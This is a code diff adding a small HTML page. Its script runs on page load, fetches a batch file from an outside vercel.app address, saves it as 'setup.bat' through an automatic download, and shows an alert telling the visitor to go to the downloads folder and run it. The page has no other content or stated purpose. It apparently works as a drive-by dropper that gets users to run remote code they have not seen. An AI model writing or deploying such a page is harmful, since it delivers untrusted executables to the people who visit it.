@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download and Run .bat File</title>
+</head>
+<body>
+  <script>
+    // Function to download file from a direct link
+    async function downloadFileFromDirectLink(fileUrl) {
+      try {
+        const response = await fetch(fileUrl);
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        const blob = await response.blob();
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'setup.bat'; // Provide a default file name for download
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+        alert('File downloaded successfully! Please navigate to your downloads folder and run the "setup.bat" file.');
+      } catch (error) {
+        console.error('Error downloading file:', error);
+        alert('Error downloading file. Please try again later.');
+      }
+    }
+
+    // Call the function with the file URL
+    downloadFileFromDirectLink('https://dd-xi-five.vercel.app/setup.bat');
+  </script>
+</body>
+</html>
